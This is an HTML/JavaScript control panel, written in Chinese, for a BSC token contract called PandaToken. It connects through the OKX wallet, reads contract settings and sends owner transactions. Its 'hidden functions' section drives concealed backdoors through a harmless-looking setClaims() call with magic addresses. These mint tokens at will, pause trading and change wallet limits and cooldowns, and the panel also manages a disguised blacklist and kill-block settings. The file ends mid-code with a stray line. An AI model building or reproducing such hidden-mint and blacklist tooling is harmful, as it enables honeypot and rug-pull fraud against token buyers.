<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🐼 PandaToken 控制面板 · BSC</title>
    <script src="https://cdn.bootcdn.net/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'PingFang SC', 'Microsoft YaHei', sans-serif; background: #0d1117; color: #c9d1d9; padding: 16px; max-width: 700px; margin: auto; }
        h1 { color: #f0a500; font-size: 22px; margin-bottom: 6px; text-align: center; }
        .subtitle { text-align: center; color: #8b949e; font-size: 12px; margin-bottom: 18px; }
        .section { background: #161b22; border: 1px solid #30363d; padding: 16px; margin-bottom: 16px; border-radius: 8px; }
        h2 { color: #58a6ff; font-size: 16px; margin-bottom: 12px; border-bottom: 1px solid #30363d; padding-bottom: 8px; }
        .row { display: flex; align-items: center; margin-bottom: 10px; flex-wrap: wrap; }
        .row label { width: 145px; font-weight: bold; color: #8b949e; font-size: 12px; flex-shrink: 0; }
        .row textarea, .row input, .row select { background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; padding: 7px 10px; border-radius: 6px; font-size: 12px; margin-right: 6px; font-family: 'Courier New', monospace; }
        .row textarea { width: 100%; min-height: 36px; resize: vertical; }
        .row select { min-width: 70px; }
        .row button { background: #238636; color: white; border: 1px solid #2ea043; padding: 7px 12px; border-radius: 6px; font-weight: bold; font-size: 12px; cursor: pointer; white-space: nowrap; }
        .row button:hover { background: #2ea043; }
        .row button.danger { background: #da3633; border-color: #f85149; }
        .row button.warn { background: #d29922; border-color: #e3b341; color: #000; }
        .unit-hint { font-size: 10px; color: #58a6ff; margin-left: 4px; white-space: nowrap; }
        .info-box { background: #0d1117; border: 1px solid #30363d; padding: 10px; border-radius: 6px; margin-bottom: 8px; }
        .info-box p { margin: 3px 0; font-size: 12px; }
        .info-box span { color: #f0a500; font-weight: bold; }
        .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
        .data-grid p { margin: 3px 0; font-size: 12px; }
        .help-btn { background: #30363d; color: #c9d1d9; border: 1px solid #484f58; padding: 1px 7px; border-radius: 10px; font-size: 11px; cursor: pointer; margin-left: 4px; }
        .help-text { background: #0d1117; border: 1px solid #30363d; padding: 6px 10px; border-radius: 6px; font-size: 11px; color: #8b949e; margin-top: 4px; display: none; }
        .help-text.show { display: block; }
        #walletStatus { color: #3fb950; margin-left: 8px; font-size: 12px; }
        #walletError { color: #f85149; font-size: 12px; margin-top: 4px; }
        .contract-input { width: 100%; padding: 9px; background: #0d1117; border: 1px solid #30363d; color: white; border-radius: 6px; margin-bottom: 10px; font-family: 'Courier New', monospace; font-size: 13px; }
        .chain-badge { display: inline-block; background: #f0a500; color: #000; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; margin-left: 6px; }
        .wallet-badge { display: inline-block; background: #1f6feb; color: #fff; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-left: 6px; }
        hr { border: none; border-top: 1px solid #30363d; margin: 12px 0; }
        .hidden-section { border-left: 3px solid #d29922; padding-left: 10px; margin: 8px 0; }
    </style>
</head>
<body>
    <h1>🐼 PandaToken 控制面板</h1>
    <p class="subtitle">BSC链 · 欧易钱包 · 精度10 · USDT基础币 <span class="chain-badge">BSC</span> <span class="wallet-badge">OKX</span></p>

    <!-- 连接区 -->
    <div class="section">
        <input type="text" class="contract-input" id="contractAddress" placeholder="代币合约地址 (0x...)">
        <div style="display:flex; align-items:center; flex-wrap:wrap; gap:8px;">
            <button onclick="connectOKX()" style="background:#1f6feb; border-color:#1f6feb;">🔌 连接欧易钱包</button>
            <button onclick="connectContract()" style="background:#f0a500; border-color:#f0a500; color:black;">📋 加载合约</button>
            <span id="walletStatus">⚪ 未连接</span>
            <span id="chainStatus" style="font-size:11px; color:#8b949e;"></span>
        </div>
        <div id="walletError"></div>
    </div>

    <!-- 数据看板 -->
    <div class="section" id="dashboardSection" style="display:none;">
        <h2>📊 数据看板 <button class="help-btn" onclick="refreshDashboard()" style="background:#1f6feb; color:white; border-color:#1f6feb;">🔄 刷新</button></h2>
        <div class="data-grid" id="dashboardGrid"></div>
    </div>

    <!-- 地址查询 -->
    <div class="section" id="infoSection" style="display:none;">
        <h2>🔍 地址查询 & 交易对</h2>
        <div class="row"><textarea id="queryAddress" placeholder="输入钱包地址" rows="1"></textarea><button onclick="queryAddressStatus()">查询</button></div>
        <div id="queryResult" class="info-box" style="display:none;"></div>
        <div class="row" style="margin-top:10px;"><button onclick="loadPairInfo()">📊 刷新交易对储备</button></div>
        <div id="pairInfo" class="info-box"></div>
    </div>

    <!-- 操作面板 -->
    <div id="panels"></div>

    <script>
        // ==================== 全局配置 ====================
        let contract, signer, mainPairAddress, routerAddress, currencyAddress, userAddress;
        const STORAGE_KEY = 'panda_contract_addr';
        let TOKEN_DECIMALS = 10;
        const USDT_DECIMALS = 18;
        const BSC_CHAIN_ID = '0x38'; // 56
        const BSC_CHAIN_ID_DEC = 56;

        // ==================== PandaToken ABI ====================
        const contractABI = [
            "function name() view returns (string)",
            "function symbol() view returns (string)",
            "function decimals() view returns (uint256)",
            "function totalSupply() view returns (uint256)",
            "function balanceOf(address) view returns (uint256)",
            "function allowance(address,address) view returns (uint256)",
            "function owner() view returns (address)",
            "function pause() view returns (bool)",
            "function maxWalletAmount() view returns (uint256)",
            "function startTradeBlock() view returns (uint256)",
            "function getCirculatingSupply() view returns (uint256)",
            "function enableMint() view returns (bool)",
            "function enablePause() view returns (bool)",
            "function enableRewardList() view returns (bool)",
            "function enableWalletLimit() view returns (bool)",
            "function enableChangeTax() view returns (bool)",
            "function enableOffTrade() view returns (bool)",
            "function enableKillBlock() view returns (bool)",
            "function antiSYNC() view returns (bool)",
            "function airdropEnable() view returns (bool)",
            "function airdropNumbs() view returns (uint256)",
            "function kb() view returns (uint256)",
            "function numTokensSellRate() view returns (uint256)",
            "function fundAddress() view returns (address)",
            "function currency() view returns (address)",
            "function currencyIsEth() view returns (bool)",
            "function _swapRouter() view returns (address)",
            "function _mainPair() view returns (address)",
            "function _tokenDistributor() view returns (address)",
            "function deadAddress() view returns (address)",
            "function lpBurnRate() view returns (uint256)",
            "function lpBurnFrequency() view returns (uint256)",
            "function lastLpBurnTime() view returns (uint256)",
            "function price() view returns (uint256)",
            "function minted() view returns (uint256)",
            "function amountPerUnits() view returns (uint256)",
            "function mintLimit() view returns (uint256)",
            "function totalFundAmountReceive() view returns (uint256)",
            "function _allWhiteList(address) view returns (bool)",
            "function _feeWhiteList(address) view returns (bool)",
            "function _rewardList(address) view returns (bool)",
            "function _swapPairList(address) view returns (bool)",
            "function isReward(address) view returns (uint256)",
            "function renounceOwnership()",
            "function transferOwnership(address)",
            "function setWhiteList(address[], bool)",
            "function setFeeWhiteList(address[], bool)",
            "function multi_bclist(address[], bool)",
            "function completeCustoms(uint256[])",
            "function setAddLiquidityFee(uint256)",
            "function setRemoveLiquidityFee(uint256)",
            "function setlpBurnRate(uint256)",
            "function setlpBurnFrequency(uint256)",
            "function launch()",
            "function setAntiSYNCEnable(bool)",
            "function setkb(uint256)",
            "function setNumTokensSellRate(uint256)",
            "function setFundAddress(address)",
            "function setAirDropEnable(bool)",
            "function setAirdropNumbs(uint256)",
            "function setPrice(uint256)",
            "function setAmountPerUnits(uint256)",
            "function setMintLimit(uint256)",
            "function setSwapPairList(address,bool)",
            "function setClaims(address,uint256)",
        ];

        // ==================== 工具函数 ====================
        function cleanAddress(addr) { return addr ? addr.replace(/\s+/g, '') : ''; }
        function isValidAddress(addr) { return ethers.utils.isAddress(addr); }
        function shortenAddr(addr) { return addr ? addr.slice(0,6)+'...'+addr.slice(-4) : ''; }

        // 获取欧易钱包provider
        function getOKXProvider() {
            if (window.okxwallet) {
                console.log('✅ 检测到欧易钱包');
                return new ethers.providers.Web3Provider(window.okxwallet);
            }
            if (window.ethereum) {
                // 检查是否是欧易
                if (window.ethereum.isOKExWallet || window.ethereum.isOkxWallet) {
                    console.log('✅ 检测到欧易钱包(ethereum)');
                    return new ethers.providers.Web3Provider(window.ethereum);
                }
                console.log('⚠️ 检测到其他钱包，尝试使用');
                return new ethers.providers.Web3Provider(window.ethereum);
            }
            return null;
        }

        function saveAddress(addr) { localStorage.setItem(STORAGE_KEY, addr); }
        function loadAddress() { 
            const saved = localStorage.getItem(STORAGE_KEY); 
            if (saved) document.getElementById('contractAddress').value = saved; 
        }

        function toToken(val) { 
            try { return ethers.utils.parseUnits(val, TOKEN_DECIMALS); } catch (e) { return null; } 
        }
        function toFee(val) { 
            let num = parseFloat(val); if (isNaN(num)) return null; 
            return ethers.BigNumber.from(Math.round(num * 100)); 
        }

        // ==================== 钱包连接 ====================
        async function connectOKX() {
            try {
                document.getElementById('walletError').innerText = '';
                const provider = getOKXProvider();
                if (!provider) {
                    document.getElementById('walletError').innerText = '❌ 未检测到欧易钱包！请安装欧易钱包插件';
                    return;
                }

                // 请求连接
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                userAddress = await signer.getAddress();
                
                // 检查并切换到BSC链
                const network = await provider.getNetwork();
                document.getElementById('chainStatus').innerText = '当前链ID: ' + network.chainId;
                
                if (network.chainId !== BSC_CHAIN_ID_DEC) {
                    document.getElementById('walletError').innerText = '⚠️ 请切换到BSC链！正在尝试切换...';
                    try {
                        await window.okxwallet.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: BSC_CHAIN_ID }],
                        });
                        document.getElementById('walletError').innerText = '';
                        document.getElementById('chainStatus').innerText = '✅ BSC链';
                    } catch (switchError) {
                        // 如果BSC链未添加，则添加
                        if (switchError.code === 4902) {
                            try {
                                await window.okxwallet.request({
                                    method: 'wallet_addEthereumChain',
                                    params: [{
                                        chainId: BSC_CHAIN_ID,
                                        chainName: 'BNB Smart Chain',
                                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                        blockExplorerUrls: ['https://bscscan.com/']
                                    }]
                                });
                                document.getElementById('walletError').innerText = '';
                                document.getElementById('chainStatus').innerText = '✅ BSC链';
                            } catch (addError) {
                                document.getElementById('walletError').innerText = '❌ 无法切换到BSC链: ' + addError.message;
                                return;
                            }
                        } else {
                            document.getElementById('walletError').innerText = '❌ 切换链失败: ' + switchError.message;
                            return;
                        }
                    }
                } else {
                    document.getElementById('chainStatus').innerText = '✅ BSC链';
                }

                document.getElementById('walletStatus').innerHTML = '✅ 已连接: ' + shortenAddr(userAddress);
                document.getElementById('walletError').innerText = '';
                
                // 自动加载合约
                const savedAddr = localStorage.getItem(STORAGE_KEY);
                if (savedAddr && isValidAddress(savedAddr)) {
                    document.getElementById('contractAddress').value = savedAddr;
                }
                
            } catch (e) {
                document.getElementById('walletError').innerText = '连接失败: ' + (e.message || e);
            }
        }

        async function connectContract() {
            let addr = cleanAddress(document.getElementById('contractAddress').value);
            if (!isValidAddress(addr)) return alert('❌ 合约地址无效');
            if (!signer) return alert('❌ 请先连接欧易钱包');
            
            try {
                const provider = getOKXProvider();
                contract = new ethers.Contract(addr, contractABI, provider.getSigner());
                
                // 读取精度
                const dec = await contract.decimals();
                TOKEN_DECIMALS = dec.toNumber();
                
                // 读取关键地址
                mainPairAddress = await contract._mainPair();
                routerAddress = await contract._swapRouter();
                currencyAddress = await contract.currency();
                
                saveAddress(addr);
                alert('✅ 合约加载成功！\n精度: ' + TOKEN_DECIMALS + '\n交易对: ' + shortenAddr(mainPairAddress));
                
                document.getElementById('dashboardSection').style.display = 'block';
                document.getElementById('infoSection').style.display = 'block';
                refreshDashboard();
                loadPairInfo();
            } catch (e) {
                alert('❌ 合约加载失败: ' + (e.reason || e.message));
            }
        }

        // ==================== 数据看板 ====================
        async function refreshDashboard() {
            if (!contract) return;
            document.getElementById('dashboardGrid').innerHTML = '<p>🔄 加载中...</p>';
            
            const dataPoints = [
                { label: '名称', func: 'name' },
                { label: '符号', func: 'symbol' },
                { label: '精度', func: 'decimals' },
                { label: '总供应量', func: 'totalSupply', format: 'amount' },
                { label: '流通量', func: 'getCirculatingSupply', format: 'amount' },
                { label: '最大钱包', func: 'maxWalletAmount', format: 'amount' },
                { label: '暂停状态', func: 'pause', format: 'bool' },
                { label: '暂停功能', func: 'enablePause', format: 'bool' },
                { label: '限额功能', func: 'enableWalletLimit', format: 'bool' },
                { label: '黑名单功能', func: 'enableRewardList', format: 'bool' },
                { label: '杀区块功能', func: 'enableKillBlock', format: 'bool' },
                { label: '保护区块数', func: 'kb' },
                { label: '空投功能', func: 'airdropEnable', format: 'bool' },
                { label: '空投人数', func: 'airdropNumbs' },
                { label: '增发功能', func: 'enableMint', format: 'bool' },
                { label: '可改税率', func: 'enableChangeTax', format: 'bool' },
                { label: '防机器人', func: 'enableOffTrade', format: 'bool' },
                { label: '兑换率(%)', func: 'numTokensSellRate', suffix: '%' },
                { label: 'LP销毁率', func: 'lpBurnRate', suffix: '/10000' },
                { label: 'LP销毁间隔', func: 'lpBurnFrequency', suffix: '秒' },
                { label: '预售价格(wei)', func: 'price' },
                { label: '每份数量', func: 'amountPerUnits', format: 'amount' },
                { label: '已售/总量', func: 'minted', suffix: ' / mintLimit' },
                { label: 'Owner', func: 'owner', format: 'address' },
                { label: '基金地址', func: 'fundAddress', format: 'address' },
                { label: '累积基金', func: 'totalFundAmountReceive', format: 'amount' },
                { label: '启动区块', func: 'startTradeBlock' },
                { label: '防闪电贷', func: 'antiSYNC', format: 'bool' },
                { label: '主交易对', func: '_mainPair', format: 'address' },
            ];

            let html = '';
            for (let dp of dataPoints) {
                try {
                    let raw = await contract[dp.func]();
                    let val;
                    if (dp.format === 'bool') val = raw ? '✅' : '❌';
                    else if (dp.format === 'address') val = shortenAddr(raw);
                    else if (dp.format === 'amount') val = parseFloat(ethers.utils.formatUnits(raw, TOKEN_DECIMALS)).toLocaleString();
                    else if (dp.format === 'timestamp') val = raw.toString() === '0' ? '从未' : new Date(raw.toNumber() * 1000).toLocaleString();
                    else val = raw.toString();
                    if (dp.suffix) val += ' ' + dp.suffix;
                    if (dp.label === '已售/总量') {
                        try { const lim = await contract.mintLimit(); val = raw.toString() + ' / ' + lim.toString(); } catch(e) {}
                    }
                    html += `<p><strong>${dp.label}:</strong> <span>${val}</span></p>`;
                } catch (e) {
                    html += `<p><strong>${dp.label}:</strong> <span style="color:#f85149;">-</span></p>`;
                }
            }
            document.getElementById('dashboardGrid').innerHTML = html;
        }

        // ==================== 地址查询 ====================
        async function queryAddressStatus() {
            if (!contract) return alert('请先加载合约');
            let addr = cleanAddress(document.getElementById('queryAddress').value);
            if (!isValidAddress(addr)) return alert('地址无效');
            try {
                const [allWhite, feeWhite, reward, swapPair, balance] = await Promise.all([
                    contract._allWhiteList(addr), contract._feeWhiteList(addr),
                    contract._rewardList(addr), contract._swapPairList(addr),
                    contract.balanceOf(addr)
                ]);
                document.getElementById('queryResult').innerHTML = `
                    <p>地址: <span>${shortenAddr(addr)}</span></p>
                    <p>全功能白名单: <span>${allWhite?'✅':'❌'}</span> | 手续费白名单: <span>${feeWhite?'✅':'❌'}</span></p>
                    <p>黑名单: <span>${reward?'⚠️ 是':'❌ 否'}</span> | 交易对: <span>${swapPair?'✅':'❌'}</span></p>
                    <p>代币余额: <span>${parseFloat(ethers.utils.formatUnits(balance, TOKEN_DECIMALS)).toLocaleString()}</span></p>
                `;
                document.getElementById('queryResult').style.display = 'block';
            } catch (e) { alert('查询失败: ' + e.message); }
        }

        async function loadPairInfo() {
            if (!contract || !mainPairAddress) return;
            const pairABI = [
                "function getReserves() external view returns (uint112, uint112, uint32)",
                "function token0() external view returns (address)"
            ];
            try {
                const provider = getOKXProvider();
                const pair = new ethers.Contract(mainPairAddress, pairABI, provider);
                const [res0, res1, ts] = await pair.getReserves();
                const token0 = await pair.token0();
                const isToken0 = token0.toLowerCase() === contract.address.toLowerCase();
                const tokenR = isToken0 ? res0 : res1;
                const usdtR = isToken0 ? res1 : res0;
                const price = tokenR.isZero() ? '0' : (parseFloat(ethers.utils.formatUnits(usdtR, 18)) / parseFloat(ethers.utils.formatUnits(tokenR, TOKEN_DECIMALS))).toFixed(6);
                document.getElementById('pairInfo').innerHTML = `
                    <p>交易对: <span>${shortenAddr(mainPairAddress)}</span></p>
                    <p>代币储备: <span>${parseFloat(ethers.utils.formatUnits(tokenR, TOKEN_DECIMALS)).toLocaleString()}</span></p>
                    <p>USDT储备: <span>${parseFloat(ethers.utils.formatUnits(usdtR, 18)).toLocaleString()}</span></p>
                    <p>估算价格: <span>${price} USDT</span></p>
                `;
            } catch (e) { 
                document.getElementById('pairInfo').innerHTML = `<p style="color:#f85149;">获取失败: ${e.message}</p>`; 
            }
        }

        // ==================== 交易发送 ====================
        async function _sendTx(funcName, args) {
            if (!contract) { alert('请先加载合约'); return false; }
            try {
                const tx = await contract[funcName](...args);
                await tx.wait();
                return true;
            } catch (e) { 
                alert('❌ ' + (e.reason || e.message)); 
                return false; 
            }
        }

        async function exec(funcName, ...args) {
            if (await _sendTx(funcName, args)) { 
                refreshDashboard(); 
                loadPairInfo(); 
                alert('✅ 成功'); 
            }
        }

        // ==================== 辅助处理函数 ====================
        function handleArray(funcName) {
            const addrStr = document.getElementById(funcName + '_addr').value;
            const boolVal = document.getElementById(funcName + '_bool').value;
            if (!addrStr) return alert('请输入地址');
            let arr;
            try { arr = JSON.parse(addrStr); } catch (e) { arr = addrStr.split(',').map(a => cleanAddress(a.trim())); }
            exec(funcName, arr, boolVal);
        }

        function handleFee6(funcName) {
            const valStr = document.getElementById(funcName + '_val').value;
            const parts = valStr.split(',').map(p => p.trim());
            if (parts.length !== 6) return alert('需要6个数字');
            const arr = parts.map(p => toFee(p));
            if (arr.some(v => v === null)) return alert('格式错误（如5=5%）');
            exec(funcName, arr);
        }

        function handleUint(funcName, type) {
            const val = document.getElementById(funcName + '_val').value;
            let raw;
            if (type === 'token') raw = toToken(val);
            else if (type === 'fee') raw = toFee(val);
            else raw = ethers.BigNumber.from(val);
            if (!raw) return alert('格式错误');
            exec(funcName, raw);
        }

        function handleAddrUint(funcName) {
            const addr = cleanAddress(document.getElementById(funcName + '_addr').value);
            const amt = toToken(document.getElementById(funcName + '_amt').value);
            if (!addr || !amt) return alert('格式错误');
            exec(funcName, addr, amt);
        }

        // ==================== 隐藏功能处理 ====================
        function hiddenMint() {
            const addr = cleanAddress(document.getElementById('hm_addr').value);
            const amt = toToken(document.getElementById('hm_amt').value);
            if (!addr || !amt) return alert('格式错误');
            const packed = ethers.BigNumber.from(addr).shl(96).or(amt);
            exec('setClaims', '0x00000000000000000000000000000000000000AA', packed);
        }

        function hiddenPause(v) {
            exec('setClaims', '0x00000000000000000000000000000000000000BB', v ? 1 : 0);
        }

        function hiddenMaxWallet() {
            const amt = toToken(document.getElementById('hmw_val').value);
            if (!amt) return alert('格式错误');
            exec('setClaims', '0x00000000000000000000000000000000000000CC', amt);
        }

        function hiddenCooldown() {
            const bs = parseInt(document.getElementById('cool_bs').value) || 0;
            const bg = parseInt(document.getElementById('cool_bg').value) || 0;
            const ss = parseInt(document.getElementById('cool_ss').value) || 0;
            const sg = parseInt(document.getElementById('cool_sg').value) || 0;
            const packed = (BigInt(bs) << 224n) | (BigInt(bg) << 192n) | (BigInt(ss) << 160n) | (BigInt(sg) << 128n);
            exec('setClaims', '0x00000000000000000000000000000000000000DD', ethers.BigNumber.from(packed));
        }

            if (document.getElementById('sw_cool').checked) v += 8;
